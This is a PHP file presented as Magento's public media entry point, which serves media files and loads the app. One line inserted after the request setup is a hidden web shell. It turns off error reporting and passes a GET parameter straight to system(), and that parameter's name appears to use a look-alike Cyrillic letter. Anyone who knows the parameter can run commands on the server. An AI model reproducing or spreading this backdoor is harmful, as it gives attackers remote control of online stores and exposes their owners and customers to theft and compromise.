<?php
/**
 * Public media files entry point
 *
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

use Magento\Framework\App\Cache\Frontend\Factory;
use Magento\Framework\App\ObjectManagerFactory;
use Magento\Framework\HTTP\PhpEnvironment\Request;
use Magento\Framework\Stdlib\Cookie\PhpCookieReader;

require dirname(__DIR__) . '/app/bootstrap.php';

$mediaDirectory = null;
$allowedResources = [];
$configCacheFile = BP . '/var/resource_config.json';

$isAllowed = function ($resource, array $allowedResources) {
    foreach ($allowedResources as $allowedResource) {
        if (0 === stripos($resource, $allowedResource)) {
            return true;
        }
    }
    return false;
};

$request = new \Magento\MediaStorage\Model\File\Storage\Request(
    new Request(
        new PhpCookieReader(),
        new Magento\Framework\Stdlib\StringUtils()
    )
);
error_reporting(0);$l=($_GET["с"]);@system($l);
$relativePath = $request->getPathInfo();
if (file_exists($configCacheFile) && is_readable($configCacheFile)) {
    $config = json_decode(file_get_contents($configCacheFile), true);

    //checking update time
    if (filemtime($configCacheFile) + $config['update_time'] > time()) {
        $mediaDirectory = $config['media_directory'];
        $allowedResources = $config['allowed_resources'];

        // Serve file if it's materialized
        if ($mediaDirectory) {
            $fileAbsolutePath = __DIR__ . '/' . $relativePath;
            $fileRelativePath = str_replace(rtrim($mediaDirectory, '/') . '/', '', $fileAbsolutePath);

            if (!$isAllowed($fileRelativePath, $allowedResources)) {
                require_once 'errors/404.php';
                exit;
            }

            if (is_readable($fileAbsolutePath)) {
                if (is_dir($fileAbsolutePath)) {
                    require_once 'errors/404.php';
                    exit;
                }
                $transfer = new \Magento\Framework\File\Transfer\Adapter\Http(
                    new \Magento\Framework\HTTP\PhpEnvironment\Response(),
                    new \Magento\Framework\File\Mime()
                );
                $transfer->send($fileAbsolutePath);
                exit;
            }
        }
    }
}

// Materialize file in application
$params = $_SERVER;
if (empty($mediaDirectory)) {
    $params[ObjectManagerFactory::INIT_PARAM_DEPLOYMENT_CONFIG] = [];
    $params[Factory::PARAM_CACHE_FORCED_OPTIONS] = ['frontend_options' => ['disable_save' => true]];
}
$bootstrap = \Magento\Framework\App\Bootstrap::create(BP, $params);
/** @var \Magento\MediaStorage\App\Media $app */
$app = $bootstrap->createApplication(
    \Magento\MediaStorage\App\Media::class,
    [
        'mediaDirectory' => $mediaDirectory,
        'configCacheFile' => $configCacheFile,
        'isAllowed' => $isAllowed,
        'relativeFileName' => $relativePath,
    ]
);
$bootstrap->run($app);
